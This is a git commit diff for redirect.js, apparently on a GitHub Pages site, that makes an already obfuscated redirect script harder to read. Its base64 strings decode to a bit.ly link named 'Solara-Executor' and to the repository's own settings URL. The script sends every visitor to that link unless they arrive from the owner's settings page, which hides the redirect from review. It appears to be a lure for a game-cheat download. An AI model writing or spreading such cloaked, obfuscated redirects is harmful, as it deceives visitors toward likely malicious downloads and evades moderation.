558e597ccc1fd5f30a15a3312b4cd49de0e78ec2
RebornPhantom <83071483+RebornPhantom@users.noreply.github.com>
2024-08-22 14:29:03 -0400

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -1,34 +1,34 @@
-window._obf_a = window._obf_a || [];
+window._0 = window._0 || [];
 
-function _obf_func_0() {
-    _obf_a.push(arguments);
+function _1() {
+    _0.push(arguments);
 }
-_obf_func_0('js', new Date());
-_obf_func_0('config', _obf_func_4('Ry1OVFRQNVlEWUw3'));
+_1(_4('anM='), new Date());
+_1(_4('Y29uZmln'), _4('Ry1OVFRQNVlEWUw3'));
 
-function _obf_func_1() {
+function _2() {
     return document.referrer;
 }
 
-function _obf_func_2() {
-    const _obf_var_0 = _obf_func_1();
-    const _obf_var_1 = _obf_func_4('aHR0cHM6Ly9naXRodWIuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9zZXR0aW5ncy9wYWdlcw==');
-    return _obf_var_0 !== _obf_var_1;
+function _3() {
+    const _var0 = _2();
+    const _var1 = _4('aHR0cHM6Ly9naXRodWIuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9zZXR0aW5ncy9wYWdlcw==');
+    return _var0 !== _var1;
 }
 
-function _obf_func_3() {
+function _5() {
     setTimeout(() => {
-        const _obf_url = _obf_func_4('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
-        window.location.href = _obf_url;
+        const _url = _4('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
+        window.location.href = _url;
     }, 100);
 }
 
-function _obf_func_4(encodedStr) {
+function _4(encodedStr) {
     return atob(encodedStr);
 }
 
-if (_obf_func_2()) {
-    _obf_func_3();
+if (_3()) {
+    _5();
 } else {
-    console.log('Redirect blocked due to _obf_func_2.');
+    console.log(_4('UmVkaXJlY3QgbG9jYWwgYmxvY2tlZCBkdWUgdG8gXzM='));
 }
